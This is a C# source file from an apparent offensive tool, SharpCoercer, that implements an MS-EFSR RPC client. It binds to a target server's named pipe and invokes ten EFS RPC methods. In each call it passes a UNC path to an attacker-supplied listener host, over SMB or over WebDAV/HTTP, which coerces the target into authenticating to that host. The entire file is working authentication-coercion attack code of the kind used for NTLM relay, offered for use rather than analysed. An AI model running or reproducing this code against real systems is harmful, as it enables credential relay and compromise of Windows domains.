using SharpCoercer.Abstracts;
using SharpCoercer.Helpers;
using SharpCoercer.Win32;
using SharpCoercer.Win32.Structs;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpCoercer.RpcClients.Efs
{

    //no worries it will fail becuase there is not construtor with no parameters
    internal class EfsRpcClientBase : RpcClientBase, IRpcClient
    {
        private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x30, 0x41, 0x00, 0x00, 0x11, 0x04, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x00, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xe1, 0x00, 0x00, 0x11, 0x14, 0x02, 0x00, 0x12, 0x00, 0x90, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0x1d, 0x00, 0x06, 0x00, 0x01, 0x5b, 0x15, 0x00, 0x06, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x1b, 0x03, 0x04, 0x00, 0x04, 0x00, 0xf9, 0xff, 0x01, 0x00, 0x08, 0x5b, 0x17, 0x03, 0x08, 0x00, 0xf0, 0xff, 0x02, 0x02, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xe2, 0xff, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x00, 0xb8, 0xff, 0x12, 0x00, 0xd8, 0xff, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x12, 0x00, 0xd4, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0x68, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0x11, 0x00, 0xea, 0xff, 0x11, 0x00, 0x62, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x04, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x4c, 0x00, 0xdf, 0xff, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xe2, 0xff, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x38, 0xff, 0x12, 0x00, 0xd8, 0xff, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x12, 0x00, 0xd8, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0x96, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0x12, 0x00, 0x0c, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x04, 0x00, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xec, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x00, 0xff, 0x11, 0x14, 0xdc, 0xff, 0x11, 0x00, 0xe6, 0xff, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x00, 0x32, 0xff, 0x12, 0x00, 0x7e, 0xff, 0x12, 0x00, 0xc8, 0xff, 0x12, 0x08, 0x25, 0x5c };
        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x08, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x14, 0x41, 0x08, 0x00, 0x18, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x0c, 0x01, 0x08, 0x00, 0x26, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x08, 0x00, 0x30, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x38, 0x00, 0x40, 0x01, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x32, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x36, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x36, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0xcc, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x48, 0x01, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x08, 0x00, 0x46, 0x07, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x28, 0x00, 0x5c, 0x01, 0x48, 0x00, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x04, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x13, 0x20, 0x18, 0x00, 0x7e, 0x01, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x08, 0x00, 0x46, 0x07, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x28, 0x00, 0x5c, 0x01, 0x48, 0x00, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x5c, 0x01, 0x0b, 0x01, 0x18, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x20, 0x00, 0x48, 0x01, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x10, 0x00, 0x08, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x5c, 0x01, 0x0b, 0x01, 0x18, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x13, 0x20, 0x28, 0x00, 0x7e, 0x01, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x7e, 0x01, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x5c, 0x01, 0x0b, 0x01, 0x18, 0x00, 0x6a, 0x01, 0x0b, 0x00, 0x20, 0x00, 0x86, 0x01, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x44, 0x01, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x00, 0x10, 0x00, 0xa4, 0x01, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00 };


        public string Name => "MS-EFSR";
        public string Description => "RPC-based protocol for remote maintenance of encrypted network file data.";

        public bool HttpCoerce => true;

        public EfsRpcClientBase(string interfaceID , string pipeName)
        {
            _interfaceId = new Guid(interfaceID);
            _pipeName = pipeName;

            BuildStub(MIDL_TypeFormatStringx64, MIDL_ProcFormatStringx64, 1, 0);
        }
        private void BuildStub(byte[] mIDL_TypeFormatString, byte[] mIDL_ProcFormatString, ushort MajorVerson, ushort MinorVersion)
        {
            _midl_typeFromat = mIDL_TypeFormatString;
            _midl_procFromat = mIDL_ProcFormatString;


            //rpc interface
            var rpcClientInterface = new RpcClientInterface(_interfaceId, MajorVerson, MinorVersion);
            clientInterface = GCHandle.Alloc(rpcClientInterface, GCHandleType.Pinned);

            formatString = GCHandle.Alloc(_midl_typeFromat, GCHandleType.Pinned);


            var stubObject = new MidlStubDesc(formatString.AddrOfPinnedObject(),
                                                            clientInterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate),
                                                            IntPtr.Zero,
                                                            0x801026e);


            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);

        }

        public IntPtr Bind(IntPtr hcomputerName)
        {

            string server = Marshal.PtrToStringUni(hcomputerName);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            int status;

            Console.WriteLine("Binding to " + server + " " + _pipeName);
            status = Rpcrt4.RpcStringBindingCompose(null, "ncacn_np", server, _pipeName, null, out bindingstring);
            if (status != 0)
            {
                Trace.WriteLine("RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }


            status = Rpcrt4.RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            Rpcrt4.RpcBindingFree(ref bindingstring);

            if (status != 0)
            {
                Trace.WriteLine("RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            AuthenticateRpcBinding(binding, server);

            status = Rpcrt4.RpcBindingSetOption(binding, 12, RPCTimeOut);
            if (status != 0)
            {
                Trace.WriteLine("RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Console.WriteLine("binding ok (handle=" + binding + ")");
            return binding;
        }

        public string BuildURL(string listener, int smbport = 445, int httpport = 80, bool isHttp = false)
        {

            //if http is used 
            if (isHttp)
                return $"\\\\{listener}@{httpport}/{RandomStringGenerator.Generate(3)}\\share\\file.txt";



            //if default smb port is used
            if (smbport == 445)
                return $"\\\\{listener}\\NETLOGON\\settings.ini";


            //Return the URL for the SMB share with a specific port
            return $"\\\\{listener}@{smbport}\\NETLOGON\\settings.ini";
        }

        public int EfsRpcAddUsersToFile(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                result = Rpcrt4.EfsRpcAddUsersToFile(GetStubHandle(), GetProcStringHandle(426), hBind, url, out _);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcAddUsersToFile failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcEncryptFileSrv(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                result = Rpcrt4.EfsRpcEncryptFileSrv(GetStubHandle(), GetProcStringHandle(192), hBind, url);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcEncryptFileSrv failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcDecryptFileSrv(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                result = Rpcrt4.EfsRpcDecryptFileSrv(GetStubHandle(), GetProcStringHandle(234), hBind, url, 0);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcDecryptFileSrv failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcQueryRecoveryAgents(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                result = Rpcrt4.EfsRpcQueryRecoveryAgents(GetStubHandle(), GetProcStringHandle(330), hBind, url, out _);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcQueryRecoveryAgents failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcQueryUsersOnFile(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                result = Rpcrt4.EfsRpcQueryUsersOnFile(GetStubHandle(), GetProcStringHandle(282), hBind, url, out _);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcQueryUsersOnFile failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcRemoveUsersFromFile(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {

                result = Rpcrt4.EfsRpcRemoveUsersFromFile(GetStubHandle(), GetProcStringHandle(378), hBind, url, out _);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcRemoveUsersFromFile failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcFileKeyInfo(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {

                //https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20%28EFSRPC%29%20Protocol/12.%20Remote%20call%20to%20EfsRpcFileKeyInfo%20(opnum%2012)/README.md
                //UPDATE_KEY_USED	0x00000100  

                result = Rpcrt4.EfsRpcFileKeyInfo(GetStubHandle(), GetProcStringHandle(576), hBind, url, 0x00000100, out _);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcFileKeyInfo failed: " + err);
                return err;
            }
            finally
            {

            }
            return (int)result.ToInt64();
        }
        public int EfsRpcOpenFileRaw(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;
            try
            {

                IntPtr hStub = GetStubHandle();

                IntPtr hContext = IntPtr.Zero;

                result = Rpcrt4.EfsRpcOpenFileRaw(hStub, GetProcStringHandle(0), hBind, out hContext, url, 0);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcOpenFileRaw failed: " + err);
                return err;
            }

            return (int)result.ToInt64();
        }
        public int EfsRpcDuplicateEncryptionInfoFile(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                //FILE_ATTRIBUTE_NORMAL	0x00000080	
                //CREATE_NEW	0x00000001
                result = Rpcrt4.EfsRpcDuplicateEncryptionInfoFile(GetStubHandle(), GetProcStringHandle(630), hBind, url, url, 0x00000001, 0, null, 0);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcDuplicateEncryptionInfoFile failed: " + err);
                return err;
            }
            finally
            {

            }
            return (int)result.ToInt64();
        }
        public int EfsRpcAddUsersToFileEx(IntPtr hBind, string computername, string url)
        {
            IntPtr result = IntPtr.Zero;

            try
            {
                //EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE	0x00000002
                IntPtr certListPtr = EncryptionCertificateList.BuildFakeEncryptionCertificateList();

                result = Rpcrt4.EfsRpcAddUsersToFileEx(GetStubHandle(), GetProcStringHandle(732), hBind, 0x00000002, IntPtr.Zero, url, certListPtr);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]EfsRpcAddUsersToFileEx failed: " + err);
                return err;
            }
            finally
            {

            }
            return (int)result.ToInt64();
        }

        public CoerceFunction[] GetFunctions()
        {
            return new CoerceFunction[]
            {
                new CoerceFunction(this, EfsRpcAddUsersToFile, nameof(EfsRpcAddUsersToFile),BuildURL),
                new CoerceFunction(this, EfsRpcEncryptFileSrv, nameof(EfsRpcEncryptFileSrv),BuildURL),
                new CoerceFunction(this, EfsRpcDecryptFileSrv, nameof(EfsRpcDecryptFileSrv), BuildURL),
                new CoerceFunction(this, EfsRpcQueryRecoveryAgents, nameof(EfsRpcQueryRecoveryAgents), BuildURL),
                new CoerceFunction(this, EfsRpcQueryUsersOnFile, nameof(EfsRpcQueryUsersOnFile), BuildURL),
                new CoerceFunction(this, EfsRpcRemoveUsersFromFile, nameof(EfsRpcRemoveUsersFromFile), BuildURL),
                new CoerceFunction(this, EfsRpcFileKeyInfo, nameof(EfsRpcFileKeyInfo), BuildURL)  ,
                new CoerceFunction(this, EfsRpcOpenFileRaw, nameof(EfsRpcOpenFileRaw), BuildURL),
                new CoerceFunction(this, EfsRpcDuplicateEncryptionInfoFile, nameof(EfsRpcDuplicateEncryptionInfoFile), BuildURL),
                new CoerceFunction(this, EfsRpcAddUsersToFileEx, nameof(EfsRpcAddUsersToFileEx), BuildURL)
            };
        }
    }

}
